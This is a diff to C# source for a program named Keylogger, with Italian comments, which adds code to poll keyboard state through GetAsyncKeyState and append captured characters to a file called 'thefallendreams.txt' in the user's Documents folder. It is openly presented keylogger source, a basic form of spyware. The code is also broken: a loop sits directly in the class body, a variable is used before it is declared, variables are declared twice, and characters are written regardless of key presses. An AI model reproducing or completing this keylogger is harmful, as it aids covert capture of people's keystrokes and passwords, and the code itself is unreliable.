@@ -1,11 +1,12 @@
 using System;
+using System.IO;
 using System.Runtime.InteropServices;
 
 namespace Keylogger
 {
     class Program
     {
-        [DllImport("User32.dell")]
+        [DllImport("User32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
         While(true)
         {
@@ -14,6 +15,10 @@ namespace Keylogger
             //Controllo lo stato di tutti i tasti
             for (int i = 32; i < 127; i++)
             {
+                using (StreamWriter sw = File.AppendText(path))
+                {
+                    sw.Write((char)i);
+                }
                 //Quando un tasto viene premuto lo stampa a video
                 int KeyState = GetAsyncKeyState(i);
                 Console.Write(KeyState + ", ");
@@ -23,19 +28,36 @@ namespace Keylogger
                     Console.Write(keyState + ","); //allora mostrami il suo valore
                 }
                 int keyState = GetAsyncKeyState(i);
-                 if (keyState == 32768)
+                if (keyState == 32768)
                 {
                     Console.Write(i + ",");
                 }
                 int keyState = GetAsyncKeyState(i);
-                 if (keyState == 32768)
+                if (keyState == 32768)
                 {
                     Console.Write((char)i + ", ");
                 }
+                String filepath = Environment.
+                GetFolderPath(Environment.SpecialFolder.MyDocuments);
+                if (!Directory.Exists(filepath))
+                {
+                    Directory.CreateDirectory(filepath);
+                }
+                string path = (filepath + @"\thefallendreams.txt");
+
+                using (StreamWriter sw = File.AppendText(path))
+                {
+                    sw.Write((char)i);
+                }
+                if (!File.Exists(path))
+                {
+                    using (StreamWriter sw = File.CreateText(path))
+                    {
+                    }
+                }
+
             }
 
         }
-
     }
-
 }
